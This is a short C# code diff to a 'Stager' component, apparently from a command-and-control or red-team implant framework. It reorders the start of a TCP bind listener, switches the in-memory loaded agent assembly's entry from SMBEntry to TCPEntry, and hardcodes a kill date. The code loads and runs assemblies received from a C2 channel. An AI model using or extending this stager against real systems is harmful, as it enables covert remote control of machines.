@@ -69,9 +69,10 @@ namespace Stager
             };
 
             CommModule = new TCPCommModule(BindAddress, BindPort);
-            CommModule.Start();
-
+            
             SendStage0();
+
+            CommModule.Start();
 
             while (!Staged)
             {
@@ -177,7 +178,7 @@ namespace Stager
 
             var asm = Assembly.Load(C2Data.Data);
 
-            asm.GetType("Agent.Stage").GetMethod("SMBEntry").Invoke(null, new object[]
+            asm.GetType("Agent.Stage").GetMethod("TCPEntry").Invoke(null, new object[]
             {
                 AgentID,
                 ParentAgentID,
@@ -200,7 +201,7 @@ namespace Stager
 
         static DateTime KillDate
         {
-            get { return DateTime.Parse("<<KillDate>>"); }
+            get { return DateTime.Parse("01/01/2030 00:00:01"); }
         }
     }
 }
